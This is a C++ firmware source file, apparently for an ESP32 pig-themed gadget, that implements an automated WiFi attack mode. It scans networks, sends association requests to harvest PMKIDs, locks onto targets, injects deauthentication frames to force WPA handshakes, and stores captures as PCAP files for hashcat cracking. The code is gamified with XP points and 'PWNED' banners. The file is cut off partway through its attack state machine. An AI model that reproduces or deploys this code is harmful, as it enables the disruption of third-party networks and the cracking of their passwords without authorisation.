// Oink Mode implementation

#include "oink.h"
#include "donoham.h"
#include "warhog.h"
#include "../core/porkchop.h"
#include "../core/config.h"
#include "../core/wsl_bypasser.h"
#include "../core/wifi_utils.h"
#include "../core/heap_gates.h"
#include "../core/sdlog.h"
#include "../core/sd_layout.h"
#include "../core/xp.h"
#include "../core/heap_policy.h"
#include "../ui/display.h"
#include "../piglet/mood.h"
#include "../piglet/avatar.h"
#include "../ui/swine_stats.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <NimBLEDevice.h>  // For BLE coexistence check
#include <SD.h>
#include <algorithm>
#include <cstdarg>  // For va_list in deferred logging
#include <esp_heap_caps.h>
#include <atomic>  // For atomic beaconCaptured flag

// NOTE: Vector mutex moved to NetworkRecon - use NetworkRecon::enterCritical()/exitCritical()
// This ensures all modes (OINK, DoNoHam, Spectrum) use the SAME mutex for the shared networks vector

// Simple flag to avoid concurrent access between promiscuous callback and main thread
// NOTE: oinkBusy is now SECONDARY protection - spinlock is PRIMARY
// The promiscuous callback runs in WiFi task context (not true ISR), but still needs
// synchronization to prevent race conditions on networks/handshakes vectors
static volatile bool oinkBusy = false;

// Minimum free heap thresholds (centralized in HeapPolicy)
static const size_t HANDSHAKE_ALLOC_MIN_BLOCK = sizeof(CapturedHandshake) + HeapPolicy::kHandshakeAllocSlack;
static const size_t PMKID_ALLOC_MIN_BLOCK = sizeof(CapturedPMKID) + HeapPolicy::kPmkidAllocSlack;

// ============ Deferred Event System ============
// Callback sets flags/data, update() processes them in main thread context
// This avoids heap operations, String allocations, and Serial.printf in callback

// NOTE: pendingNetworkAdd/pendingNetwork removed - NetworkRecon now handles network discovery
// OINK only tracks mood events, handshakes, and PMKIDs

// Pending mood events (callback sets flag, update() calls Mood functions)
static volatile bool pendingNewNetwork = false;
static char pendingNetworkSSID[33] = {0};
static int8_t pendingNetworkRSSI = 0;
static uint8_t pendingNetworkChannel = 0;

static volatile bool pendingDeauthSuccess = false;
static uint8_t pendingDeauthStation[6] = {0};

static volatile bool pendingHandshakeComplete = false;
static char pendingHandshakeSSID[33] = {0};
static volatile bool pendingAutoSave = false;  // Trigger autoSaveCheck from main loop

static volatile bool pendingPMKIDCapture = false;
static char pendingPMKIDSSID[33] = {0};

// Callback for NetworkRecon new network discovery -> XP events
static void onNewNetworkDiscovered(wifi_auth_mode_t authmode, bool isHidden, 
                                   const char* ssid, int8_t rssi, uint8_t channel) {
    // Queue mood event for main thread (Mood::onNewNetwork triggers XP::addXP)
    if (!pendingNewNetwork) {
        if (ssid) {
            strncpy(pendingNetworkSSID, ssid, 32);
            pendingNetworkSSID[32] = 0;
        } else {
            pendingNetworkSSID[0] = 0;
        }
        pendingNetworkRSSI = rssi;
        pendingNetworkChannel = channel;
        pendingNewNetwork = true;
    }
}

// Pending handshake/PMKID creation (callback queues, update() does push_back)
// This avoids vector reallocation in callback context
struct PendingHandshakeFrame {
    uint8_t bssid[6];
    uint8_t station[6];
    uint8_t messageNum;        // DEPRECATED - used only for logging now
    EAPOLFrame frames[4];      // Store all 4 EAPOL frames (M1-M4)
    uint8_t capturedMask;      // Bitmask: bit0=M1, bit1=M2, bit2=M3, bit3=M4
    uint8_t pmkid[16];         // If M1, may contain PMKID
    bool hasPMKID;
};

// Circular buffer for pending handshake frames (4 slots to handle rapid EAPOL bursts)
// STATIC POOL: Pre-allocated to avoid malloc in WiFi callback context (heap fragmentation risk)
// WARNING: Each PendingHandshakeFrame is ~3.3KB (contains 4x EAPOLFrame @ 822 bytes each)
// Total static pool: 4 * 3.3KB = ~13KB permanently in .bss - reduces heap even when idle!
static const uint8_t PENDING_HS_SLOTS = 4;
static PendingHandshakeFrame pendingHsPool[PENDING_HS_SLOTS];  // Static pool - no heap ops in callback
// #region agent log
// [DEBUG] H1: This static pool uses ~13KB of RAM - logged at compile time in .bss
// Size info logged in init() below
// #endregion
static PendingHandshakeFrame* pendingHandshakes[PENDING_HS_SLOTS] = {nullptr, nullptr, nullptr, nullptr};
static std::atomic<uint8_t> pendingHsWrite{0};
static std::atomic<uint8_t> pendingHsRead{0};
static std::atomic<bool> pendingHsBusy[PENDING_HS_SLOTS] = {
    ATOMIC_VAR_INIT(false),
    ATOMIC_VAR_INIT(false),
    ATOMIC_VAR_INIT(false),
    ATOMIC_VAR_INIT(false)
};
static std::atomic<bool> pendingHsAllocated[PENDING_HS_SLOTS] = {  // Track which pool slots are in use
    ATOMIC_VAR_INIT(false),
    ATOMIC_VAR_INIT(false),
    ATOMIC_VAR_INIT(false),
    ATOMIC_VAR_INIT(false)
};

struct PendingPMKIDCreate {
    uint8_t bssid[6];
    uint8_t station[6];
    uint8_t pmkid[16];
    char ssid[33];
};
static volatile bool pendingPMKIDCreateBusy = false;
static volatile bool pendingPMKIDCreateReady = false;
static PendingPMKIDCreate pendingPMKIDCreate;



// Static members
bool OinkMode::running = false;
bool OinkMode::scanning = false;
bool OinkMode::deauthing = false;
bool OinkMode::channelHopping = true;
uint8_t OinkMode::currentChannel = 1;
uint32_t OinkMode::lastHopTime = 0;
uint32_t OinkMode::lastScanTime = 0;
static uint32_t lastCleanupTime = 0;

// networks reference - now uses shared NetworkRecon vector
// This provides backward compatibility with existing code that uses 'networks'
static inline std::vector<DetectedNetwork>& networks() {
    return NetworkRecon::getNetworks();
}
std::vector<CapturedHandshake> OinkMode::handshakes;
std::vector<CapturedPMKID> OinkMode::pmkids;
int OinkMode::targetIndex = -1;
uint8_t OinkMode::targetBssid[6] = {0};
char OinkMode::targetSSIDCache[33] = {0};
uint8_t OinkMode::targetClientCountCache = 0;
uint8_t OinkMode::targetBssidCache[6] = {0};
bool OinkMode::targetHiddenCache = false;
bool OinkMode::targetCacheValid = false;
int OinkMode::selectionIndex = 0;
volatile uint32_t OinkMode::packetCount = 0;
uint32_t OinkMode::deauthCount = 0;
uint16_t OinkMode::filteredCount = 0;
uint64_t OinkMode::filteredCache[64] = {0};
uint8_t OinkMode::filteredCacheIndex = 0;

// Memory limits to prevent OOM
const size_t MAX_NETWORKS = 200;       // Max tracked networks
const size_t MAX_HANDSHAKES = 50;      // Max handshakes (each can be large)
const size_t MAX_PMKIDS = 50;          // Max PMKIDs (smaller than handshakes)
const uint16_t MAX_BEACON_SIZE = 1500; // IEEE 802.11 practical limit (protect against oversized/malformed frames)

// Protocol constants
static const uint8_t MAC_ADDR_LEN = 6;
static const uint8_t SSID_MAX_LEN = 32;
static const uint8_t SSID_BUF_LEN = 33;  // SSID + null terminator
static const uint8_t PMKID_LEN = 16;
static const uint8_t PMKID_KDE_TOTAL_LEN = 22;  // dd(1) + len(1) + OUI(3) + type(1) + PMKID(16)
static const uint16_t EAPOL_MIN_LEN = 99;  // Minimum EAPOL-Key frame size
static const uint16_t EAPOL_MAX_PAYLOAD = 512;  // Max EAPOL payload for storage
static const uint16_t FRAME_MAX_CAPTURE = 300;  // Max full 802.11 frame size for PCAP
static const uint16_t DEAUTH_FRAME_SIZE = 26;
static const uint16_t BEACON_FIXED_FIELDS = 36;  // Fixed fields before IEs
static const uint16_t EAPOL_MIC_OFFSET = 81;  // MIC field offset in EAPOL-Key
static const uint16_t EAPOL_ANONCE_OFFSET = 17;  // ANonce field offset in EAPOL-Key
static const uint16_t EAPOL_KEYDATA_LEN_OFFSET = 97;  // Key Data Length field offset
static const uint16_t EAPOL_KEYDATA_OFFSET = 99;  // Key Data field offset

// Timing constants
static const uint32_t DEAUTH_BURST_INTERVAL_MS = 180;  // Optimal deauth burst interval (prevents queue saturation)

// Beacon frame storage for PCAP (required for hashcat)
static uint8_t beaconFrameStorage[MAX_BEACON_SIZE] = {0};
uint8_t* OinkMode::beaconFrame = beaconFrameStorage;
uint16_t OinkMode::beaconFrameLen = 0;
std::atomic<bool> OinkMode::beaconCaptured{false};  // Atomic initialization for thread safety

// BOAR BROS - excluded networks
std::map<uint64_t, String> OinkMode::boarBros;
static const size_t MAX_BOAR_BROS = 50;  // Max excluded networks

// Channel hop order (most common channels first)
const uint8_t CHANNEL_HOP_ORDER[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
const uint8_t CHANNEL_COUNT = sizeof(CHANNEL_HOP_ORDER);
uint8_t currentHopIndex = 0;

// Deauth timing
static uint32_t lastDeauthTime = 0;
static uint32_t lastMoodUpdate = 0;

// Random hunting sniff - periodic sniff to show piglet is actively hunting
static uint32_t lastRandomSniff = 0;
static const int RANDOM_SNIFF_CHANCE = 8;  // 8% chance per second = ~12 sec average

void OinkMode::recordFilteredNetwork(const uint8_t* bssid) {
    uint64_t key = bssidToUint64(bssid);
    for (size_t i = 0; i < sizeof(filteredCache) / sizeof(filteredCache[0]); i++) {
        if (filteredCache[i] == key) {
            return;
        }
    }
    filteredCache[filteredCacheIndex] = key;
    filteredCacheIndex = (filteredCacheIndex + 1) % (sizeof(filteredCache) / sizeof(filteredCache[0]));
    if (filteredCount < 999) {
        filteredCount++;
    }
}

// Auto-attack state machine (like M5Gotchi)
enum class AutoState {
    SCANNING,       // Scanning for networks
    PMKID_HUNTING,  // Active PMKID probing phase
    LOCKING,        // Locked to target channel, discovering clients
    ATTACKING,      // Deauthing + sniffing target
    WAITING,        // Delay between attacks
    NEXT_TARGET,    // Move to next target
    BORED           // No targets available - pig is bored
};
static AutoState autoState = AutoState::SCANNING;
static uint32_t stateStartTime = 0;
static uint32_t attackStartTime = 0;
static const uint32_t SCAN_TIME = 5000;         // 5 sec initial scan
// LOCK_TIME now uses SwineStats::getLockTime() for class buff support
static const uint32_t ATTACK_TIMEOUT = 15000;   // 15 sec per target
static const uint32_t WAIT_TIME = 4500;         // 4.5 sec between targets (allows late EAPOL M3/M4)
static const uint32_t BORED_RETRY_TIME = 30000; // 30 sec between retry scans when bored
static const uint32_t BORED_THRESHOLD = 3;      // Failed target attempts before bored

// PMKID hunting variables
static int pmkidTargetIndex = 0;
static uint32_t pmkidProbeTime = 0;
static const uint32_t PMKID_TIMEOUT = 300;      // 300ms wait per AP
static const uint32_t PMKID_HUNT_MAX = 30000;   // 30s total hunt window

// Targeting heuristics
static const uint32_t CLIENT_RECENT_MS = 10000;      // Prefer clients seen within 10s
static const uint32_t LOCK_FAST_TRACK_MS = 2500;     // Fast-track lock when clients appear quickly
static const uint32_t LOCK_EARLY_EXIT_MS = 4000;     // Bail if no clients show up quickly
static const uint32_t ATTACK_COOLDOWN_MS = 8000;     // Cooldown after failed attack

// Bored state tracking
static uint8_t consecutiveFailedScans = 0;      // Track failed getNextTarget() calls
static uint32_t lastBoredUpdate = 0;            // For periodic bored mood updates

// WAITING state variables (reset in init() to prevent stale state on restart)
static bool checkedForPendingHandshake = false;
static bool hasPendingHandshake = false;

// Reset bored state on init
static bool boredStateReset = true;  // Flag to reset on start()

// Last pwned network SSID for display
static String lastPwnedSSID = "";

void OinkMode::init() {
    // #region agent log
    // [DEBUG] H1: Log static pool size to confirm ~13KB allocation
    Serial.printf("[DBG-OINK] pendingHsPool size: %u bytes (%u slots x %u each)\n",
                  (unsigned)(sizeof(pendingHsPool)), 
                  (unsigned)PENDING_HS_SLOTS,
                  (unsigned)sizeof(PendingHandshakeFrame));
    Serial.printf("[DBG-OINK] EAPOLFrame size: %u bytes\n", (unsigned)sizeof(EAPOLFrame));
    Serial.printf("[DBG-OINK] Heap before init: free=%u largest=%u\n",
                  (unsigned)ESP.getFreeHeap(),
                  (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
    // #endregion
    
    // Reset busy flag in case of abnormal stop
    oinkBusy = false;
    
    // Reset deferred event system
    pendingNewNetwork = false;
    pendingDeauthSuccess = false;
    pendingHandshakeComplete = false;
    pendingPMKIDCapture = false;
    
    // Reset bored state tracking
    consecutiveFailedScans = 0;
    lastBoredUpdate = 0;
    boredStateReset = true;
    
    // Reset static pool tracking (no heap ops - pool is pre-allocated)
    for (int i = 0; i < PENDING_HS_SLOTS; i++) {
        pendingHandshakes[i] = nullptr;
        pendingHsBusy[i] = false;
        pendingHsAllocated[i] = false;
    }
    pendingHsWrite = 0;
    pendingHsRead = 0;
    
    // Free per-handshake beacon memory
    for (auto& hs : handshakes) {
        if (hs.beaconData) {
            free(hs.beaconData);
            hs.beaconData = nullptr;
        }
    }
    
    // networks vector is now managed by NetworkRecon - just clear OINK-specific data
    handshakes.clear();
    pmkids.clear();
    
    handshakes.reserve(5);
    pmkids.reserve(10);
    filteredCount = 0;
    memset(filteredCache, 0, sizeof(filteredCache));
    filteredCacheIndex = 0;
    
    targetIndex = -1;
    memset(targetBssid, 0, 6);
    selectionIndex = 0;
    packetCount = 0;
    deauthCount = 0;
    currentHopIndex = 0;
    
    // Reset state machine
    autoState = AutoState::SCANNING;
    stateStartTime = 0;
    attackStartTime = 0;
    lastDeauthTime = 0;
    lastPwnedSSID = "";
    lastMoodUpdate = 0;
    lastRandomSniff = 0;
    checkedForPendingHandshake = false;
    hasPendingHandshake = false;
    
    // Clear beacon frame (static storage, no free)
    beaconFrame = beaconFrameStorage;
    beaconFrameLen = 0;
    beaconCaptured = false;
    
    // Load BOAR BROS exclusion list
    loadBoarBros();
}

void OinkMode::start() {
    if (running) return;
    
    Serial.printf("[OINK] Starting... free=%u largest=%u\n",
                  ESP.getFreeHeap(), heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
    
    // Ensure NetworkRecon is running (handles WiFi promiscuous mode)
    if (!NetworkRecon::isRunning()) {
        NetworkRecon::start();
    }
    
    // Initialize WSL bypasser for deauth frame injection
    WSLBypasser::init();
    
    // Register our packet callback for EAPOL/handshake capture
    NetworkRecon::setPacketCallback(promiscuousCallback);
    
    // Register callback for new network discovery (triggers XP events)
    NetworkRecon::setNewNetworkCallback(onNewNetworkDiscovered);
    
    running = true;
    scanning = true;
    channelHopping = true;
    lastHopTime = millis();
    lastScanTime = millis();
    
    // Set grass animation speed for OINK mode
    Avatar::setGrassSpeed(120);  // ~8 FPS casual trot
    
    // Initialize auto-attack state machine
    autoState = AutoState::SCANNING;
    stateStartTime = millis();
    selectionIndex = 0;
    
    Mood::setStatusMessage("hunting truffles");
    Mood::setDialogueLock(true);
    Display::setWiFiStatus(true);
    
    Serial.printf("[OINK] Started. Networks available: %d\n", NetworkRecon::getNetworkCount());
}

void OinkMode::stop() {
    if (!running) return;
    
    Serial.println("[OINK] Stopping...");
    
    deauthing = false;
    scanning = false;
    
    // Stop grass animation
    Avatar::setGrassMoving(false);
    
    // Clear our callbacks (NetworkRecon keeps running)
    NetworkRecon::setPacketCallback(nullptr);
    NetworkRecon::setNewNetworkCallback(nullptr);
    
    // Unlock channel if we locked it
    if (NetworkRecon::isChannelLocked()) {
        NetworkRecon::unlockChannel();
    }
    
    // Process any deferred XP saves
    XP::processPendingSave();
    
    // Reset beacon frame (static storage, no free)
    beaconFrame = beaconFrameStorage;
    beaconFrameLen = 0;
    beaconCaptured = false;
    
    // Free per-handshake beacon memory to prevent leaks on repeated start/stop
    for (auto& hs : handshakes) {
        if (hs.beaconData) {
            free(hs.beaconData);
            hs.beaconData = nullptr;
        }
    }
    
    // FIX: Release vector capacity to recover heap (~6KB leak)
    handshakes.clear();
    handshakes.shrink_to_fit();
    pmkids.clear();
    pmkids.shrink_to_fit();
    
    // Reset static pool tracking (no heap ops - pool is pre-allocated)
    for (int i = 0; i < PENDING_HS_SLOTS; i++) {
        pendingHandshakes[i] = nullptr;
        pendingHsBusy[i] = false;
        pendingHsAllocated[i] = false;
    }
    pendingHsWrite = 0;
    pendingHsRead = 0;
    
    running = false;
    Mood::setDialogueLock(false);
    Display::setWiFiStatus(false);
    
    Serial.printf("[OINK] Stopped. Networks: %d, Handshakes: %d\n", 
                  NetworkRecon::getNetworkCount(), handshakes.size());
}

void OinkMode::update() {
    if (!running) return;
    
    uint32_t now = millis();
    
    // #region agent log - HEAP INSTRUMENTATION
    // Track heap every 500ms to catch the exact moment it improves
    static uint32_t lastHeapLog = 0;
    static size_t lastLargest = 0;
    if (now - lastHeapLog > 500) {
        size_t currentLargest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
        size_t currentFree = ESP.getFreeHeap();
        
        // Log if this is first call or if heap changed significantly (>5KB)
        if (lastHeapLog == 0 || abs((int)currentLargest - (int)lastLargest) > 5000) {
            Serial.printf("[OINK-UPDATE] t=%ums free=%u largest=%u delta=%+d pkts=%u nets=%u\n",
                          now - stateStartTime,
                          currentFree, currentLargest,
                          (int)currentLargest - (int)lastLargest,
                          packetCount, networks().size());
        }
        lastLargest = currentLargest;
        lastHeapLog = now;
    }
    // #endregion
    
    // Guard access to networks/handshakes vectors from promiscuous callback
    // NOTE: oinkBusy is secondary protection, spinlock is primary
    oinkBusy = true;
    
    // ============ Process Deferred Events from Callback ============
    // These events were queued in promiscuous callback to avoid heap/String ops there
    
    // NOTE: Network discovery is now handled by NetworkRecon::processDeferredEvents()
    // OINK no longer needs to process pendingNetworkAdd - this was dead code after the refactor.
    
    // Process pending mood: new network discovered
    char pendingSSIDCopy[33] = {0};
    int8_t pendingRSSICopy = 0;
    uint8_t pendingChannelCopy = 0;
    bool hasPendingNewNetwork = false;
    NetworkRecon::enterCritical();
    if (pendingNewNetwork) {
        strncpy(pendingSSIDCopy, pendingNetworkSSID, 32);
        pendingSSIDCopy[32] = 0;
        pendingRSSICopy = pendingNetworkRSSI;
        pendingChannelCopy = pendingNetworkChannel;
        pendingNewNetwork = false;
        hasPendingNewNetwork = true;
    }
    NetworkRecon::exitCritical();
    if (hasPendingNewNetwork) {
        Mood::onNewNetwork(pendingSSIDCopy, pendingRSSICopy, pendingChannelCopy);
    }
    
    // Process pending mood: deauth success
    uint8_t pendingStationCopy[6] = {0};
    bool hasPendingDeauth = false;
    NetworkRecon::enterCritical();
    if (pendingDeauthSuccess) {
        memcpy(pendingStationCopy, pendingDeauthStation, sizeof(pendingStationCopy));
        pendingDeauthSuccess = false;
        hasPendingDeauth = true;
    }
    NetworkRecon::exitCritical();
    if (hasPendingDeauth) {
        Mood::onDeauthSuccess(pendingStationCopy);
    }
    
    // Process pending mood: handshake complete
    char pendingHandshakeCopy[33] = {0};
    bool hasPendingHandshakeDone = false;
    NetworkRecon::enterCritical();
    if (pendingHandshakeComplete) {
        strncpy(pendingHandshakeCopy, pendingHandshakeSSID, 32);
        pendingHandshakeCopy[32] = 0;
        pendingHandshakeComplete = false;
        hasPendingHandshakeDone = true;
    }
    NetworkRecon::exitCritical();
    if (hasPendingHandshakeDone) {
        Mood::onHandshakeCaptured(pendingHandshakeCopy);
        lastPwnedSSID = String(pendingHandshakeCopy);
        Display::showLoot(lastPwnedSSID);  // Show PWNED banner in top bar
    }
    
    // Process pending mood: PMKID captured (clientless attack - extra special!)
    char pendingPMKIDCopy[33] = {0};
    bool hasPendingPMKID = false;
    NetworkRecon::enterCritical();
    if (pendingPMKIDCapture) {
        strncpy(pendingPMKIDCopy, pendingPMKIDSSID, 32);
        pendingPMKIDCopy[32] = 0;
        pendingPMKIDCapture = false;
        hasPendingPMKID = true;
    }
    NetworkRecon::exitCritical();
    if (hasPendingPMKID) {
        Mood::onPMKIDCaptured(pendingPMKIDCopy);
        lastPwnedSSID = String(pendingPMKIDCopy);  // PMKID counts as pwned!
        Display::showLoot(lastPwnedSSID);  // Show PWNED banner in top bar
        SDLog::log("OINK", "PMKID captured: %s", pendingPMKIDCopy);
        
        // BUG FIX: Trigger auto-save for PMKID (was missing, causing beeps but no file)
        pendingAutoSave = true;
    }
    
    // Process pending auto-save (callback set flag, we do SD I/O here)
    bool shouldAutoSave = false;
    NetworkRecon::enterCritical();
    if (pendingAutoSave) {
        pendingAutoSave = false;
        shouldAutoSave = true;
    }
    NetworkRecon::exitCritical();
    if (shouldAutoSave) {
        autoSaveCheck();
    }
    
    // Process pending handshake creation from circular buffer (callback queued, we do push_back here)
    while (pendingHsRead != pendingHsWrite) {
        // Get slot from circular buffer
        uint8_t slot = pendingHsRead;
        if (pendingHsBusy[slot] || !pendingHandshakes[slot]) {
            break;  // Slot still being written by callback or not allocated, wait for next cycle
        }
        
        // Create or find handshake entry in main thread context
        int idx = findOrCreateHandshakeSafe(pendingHandshakes[slot]->bssid, pendingHandshakes[slot]->station);
        if (idx >= 0) {
            CapturedHandshake& hs = handshakes[idx];
            
            // Process ALL queued frames (M1-M4) from capturedMask
            for (int msgIdx = 0; msgIdx < 4; msgIdx++) {
                if (pendingHandshakes[slot]->capturedMask & (1 << msgIdx)) {
                    // Frame is present in the queued data
                    if (hs.frames[msgIdx].len == 0) {  // Not already captured
                        uint16_t copyLen = pendingHandshakes[slot]->frames[msgIdx].len;
                        if (copyLen > 0 && copyLen <= 512) {
                            // EAPOL payload
                            memcpy(hs.frames[msgIdx].data, pendingHandshakes[slot]->frames[msgIdx].data, copyLen);
                            hs.frames[msgIdx].len = copyLen;
                            hs.frames[msgIdx].messageNum = msgIdx + 1;
                            hs.frames[msgIdx].timestamp = millis();
                            
                            // Full 802.11 frame for PCAP
                            uint16_t fullLen = pendingHandshakes[slot]->frames[msgIdx].fullFrameLen;
                            if (fullLen > 0 && fullLen <= 300) {
                                memcpy(hs.frames[msgIdx].fullFrame, pendingHandshakes[slot]->frames[msgIdx].fullFrame, fullLen);
                                hs.frames[msgIdx].fullFrameLen = fullLen;
                                hs.frames[msgIdx].rssi = pendingHandshakes[slot]->frames[msgIdx].rssi;
                            }
                            
                            hs.capturedMask |= (1 << msgIdx);
                            hs.lastSeen = millis();
                        }
                    }
                }
            }
            
            // Get SSID for this BSSID
            for (const auto& net : networks()) {
                if (memcmp(net.bssid, pendingHandshakes[slot]->bssid, 6) == 0) {
                    strncpy(hs.ssid, net.ssid, 32);
                    hs.ssid[32] = 0;
                    break;
                }
            }
            
            // Check if handshake is now complete
            if (hs.isComplete() && !hs.saved) {
                pendingHandshakeComplete = true;
                strncpy(pendingHandshakeSSID, hs.ssid, 32);
                pendingHandshakeSSID[32] = 0;
                WarhogMode::markCaptured(hs.bssid);
                
                // Auto-save complete handshake (safe here - main thread context)
                autoSaveCheck();
            }
            
            // Handle PMKID from M1 if present
            if (pendingHandshakes[slot]->hasPMKID) {
                int pIdx = findOrCreatePMKIDSafe(pendingHandshakes[slot]->bssid, pendingHandshakes[slot]->station);
                if (pIdx >= 0 && !pmkids[pIdx].saved) {
                    memcpy(pmkids[pIdx].pmkid, pendingHandshakes[slot]->pmkid, 16);
                    // Get SSID
                    for (const auto& net : networks()) {
                        if (memcmp(net.bssid, pendingHandshakes[slot]->bssid, 6) == 0) {
                            strncpy(pmkids[pIdx].ssid, net.ssid, 32);
                            pmkids[pIdx].ssid[32] = 0;
                            break;
                        }
                    }
                }
            }
        }
        
        // Release slot back to static pool (no heap ops), advance read pointer
        pendingHandshakes[slot] = nullptr;
        pendingHsAllocated[slot] = false;
        pendingHsRead = (pendingHsRead + 1) % PENDING_HS_SLOTS;
    }
    
    // Process pending PMKID creation (callback queued, we do push_back here)
    if (pendingPMKIDCreateReady && !pendingPMKIDCreateBusy) {
        pendingPMKIDCreateBusy = true;  // Prevent callback from overwriting
        
        // Create PMKID entry in main thread context
        int idx = findOrCreatePMKIDSafe(pendingPMKIDCreate.bssid, pendingPMKIDCreate.station);
        if (idx >= 0 && !pmkids[idx].saved) {
            memcpy(pmkids[idx].pmkid, pendingPMKIDCreate.pmkid, 16);
            pmkids[idx].timestamp = millis();
            
            // SSID lookup: try callback value first, then lookup from networks
            if (pendingPMKIDCreate.ssid[0] != 0) {
                strncpy(pmkids[idx].ssid, pendingPMKIDCreate.ssid, 32);
                pmkids[idx].ssid[32] = 0;
            } else {
                // Try to find SSID from networks vector
                for (const auto& net : networks()) {
                    if (memcmp(net.bssid, pendingPMKIDCreate.bssid, 6) == 0) {
                        strncpy(pmkids[idx].ssid, net.ssid, 32);
                        pmkids[idx].ssid[32] = 0;
                        break;
                    }
                }
            }
            WarhogMode::markCaptured(pmkids[idx].bssid);
        }
        
        pendingPMKIDCreateReady = false;
        pendingPMKIDCreateBusy = false;
    }
    
    // ============ End Deferred Event Processing ============
    
    // RELEASE LOCK EARLY - state machine doesn't need exclusive vector access
    // This minimizes packet drop window from ~10ms to ~0.5ms
    oinkBusy = false;
    
    // Periodic beacon data audit to prevent leaks (every 10s - Phase 3A fix)
    // Free beacon data from saved handshakes to reclaim heap
    static uint32_t lastBeaconAudit = 0;
    if (now - lastBeaconAudit > 10000) {
        for (auto& hs : handshakes) {
            if (hs.saved && hs.beaconData) {
                free(hs.beaconData);
                hs.beaconData = nullptr;
                hs.beaconLen = 0;
            }
        }
        lastBeaconAudit = now;
    }
    
    // Sync grass animation with channel hopping state
    Avatar::setGrassMoving(channelHopping);
    
    // Auto-attack state machine (like M5Gotchi)
    switch (autoState) {
        case AutoState::SCANNING:
            {
                uint16_t hopInterval = SwineStats::getChannelHopInterval();
                
                // Channel hopping during scan (buff-modified interval)
                if (now - lastHopTime > hopInterval) {
                    hopChannel();
                    lastHopTime = now;
                }
                
                // Random hunting sniff - shows piglet is actively sniffing
                // Check every 1 second with 8% chance = ~12 second average between sniffs
                if (now - lastRandomSniff > 1000) {
                    lastRandomSniff = now;  // Always reset timer on check
                    if (random(0, 100) < RANDOM_SNIFF_CHANCE) {
                        Avatar::sniff();
                    }
                }
                
                // Update mood
                if (now - lastMoodUpdate > 3000) {
                    Mood::onSniffing(networks().size(), currentChannel);
                    lastMoodUpdate = now;
                }
                
                // After scan time, sort and enter PMKID hunting
                if (now - stateStartTime > SCAN_TIME) {
                    if (!networks().empty()) {
                        sortNetworksByPriority();
                        autoState = AutoState::PMKID_HUNTING;
                        pmkidTargetIndex = -1;
                        pmkidProbeTime = 0;  // Reset timer for first target
                        stateStartTime = now;
                        Mood::setStatusMessage("ghost farming");
                    } else {
                        // No networks found after scan time
                        consecutiveFailedScans++;
                        if (consecutiveFailedScans >= BORED_THRESHOLD) {
                            // Pig is bored - empty spectrum
                            autoState = AutoState::BORED;
                            stateStartTime = now;
                            channelHopping = false;
                            Mood::onBored(0);
                        } else {
                            // Keep scanning
                            stateStartTime = now;
                        }
                    }
                }
            }
            break;
            
        case AutoState::PMKID_HUNTING:
            {
                uint32_t huntElapsed = now - stateStartTime;
                
                // Timeout: 30s hunt window
                if (huntElapsed > PMKID_HUNT_MAX) {
                    autoState = AutoState::NEXT_TARGET;
                    stateStartTime = now;
                    Mood::setStatusMessage("weapons hot");
                    break;
                }
                
                // Only find new target if: first time OR timeout expired
                if (pmkidProbeTime == 0 || (now - pmkidProbeTime >= PMKID_TIMEOUT)) {
                    bool foundTarget = false;
                    uint8_t targetBssid[6] = {0};
                    char targetSSID[33] = {0};
                    uint8_t targetChannel = 0;
                    
                    const bool wasBusy = oinkBusy;
                    oinkBusy = true;
                    NetworkRecon::enterCritical();
                    size_t netCount = networks().size();
                    if (netCount > 0) {
                        for (int attempts = 0; attempts < (int)netCount && !foundTarget; attempts++) {
                            pmkidTargetIndex = (pmkidTargetIndex + 1) % netCount;
                            DetectedNetwork& net = networks()[pmkidTargetIndex];
                            
                            // Skip: Open, WEP, BOAR BRO, PMF, or already have PMKID
                            if (net.authmode == WIFI_AUTH_OPEN) continue;
                            if (net.authmode == WIFI_AUTH_WEP) continue;
                            if (isExcluded(net.bssid)) continue;  // BOAR BRO exclusion
                            if (net.ssid[0] == 0 || net.isHidden) continue;
                            if (net.hasPMF) continue;
                            
                            // Check if we already have PMKID for this AP
                            bool hasPMKID = false;
                            for (const auto& p : pmkids) {
                                if (memcmp(p.bssid, net.bssid, 6) == 0) {
                                    hasPMKID = true;
                                    break;
                                }
                            }
                            if (hasPMKID) continue;
                            
                            foundTarget = true;
                            memcpy(targetBssid, net.bssid, 6);
                            strncpy(targetSSID, net.ssid, 32);
                            targetSSID[32] = 0;
                            targetChannel = net.channel;
                        }
                    }
                    NetworkRecon::exitCritical();
                    oinkBusy = wasBusy;
                    
                    if (foundTarget) {
                        if (currentChannel != targetChannel) {
                            setChannel(targetChannel);
                        }
                        sendAssociationRequest(targetBssid, targetSSID, strlen(targetSSID));
                        pmkidProbeTime = now;
                        Avatar::sniff();
                    } else {
                        // No more targets to probe
                        autoState = AutoState::NEXT_TARGET;
                        stateStartTime = now;
                        Mood::setStatusMessage("weapons hot");
                    }
                }
                // else: still waiting for M1 response, do nothing
            }
            break;
            
        case AutoState::NEXT_TARGET:
            {
                // Use smart target selection
                int nextIdx = getNextTarget();
                
                if (nextIdx < 0) {
                    consecutiveFailedScans++;
                    
                    if (consecutiveFailedScans >= BORED_THRESHOLD) {
                        // Pig is bored - no targets for too long
                        autoState = AutoState::BORED;
                        stateStartTime = now;
                        channelHopping = false;  // Stop grass animation
                        deauthing = false;
                        Mood::onBored(networks().size());
                    } else {
                        // Keep trying - rescan
                        autoState = AutoState::SCANNING;
                        stateStartTime = now;
                        channelHopping = true;
                        deauthing = false;
                        Mood::setStatusMessage("sniff n drift");
                    }
                    break;
                }
                
                // Found a target - reset failed scan counter
                consecutiveFailedScans = 0;
                
                // Revalidate: Network might have been removed between getNextTarget() and here
                if (nextIdx >= (int)networks().size()) {
                    autoState = AutoState::SCANNING;
                    stateStartTime = now;
                    channelHopping = true;
                    break;
                }
                
                selectionIndex = nextIdx;
                
                // Select this target (locks to channel, stops hopping)
                selectTarget(selectionIndex);
                networks()[selectionIndex].attackAttempts++;
                
                // Go to LOCKING state to discover clients before attacking
                autoState = AutoState::LOCKING;
                stateStartTime = now;
                deauthing = false;  // Don't deauth yet, just listen
                channelHopping = false;  // Ensure channel stays locked during capture phase
                
                // #region agent log - H1/H2 state transition to LOCKING
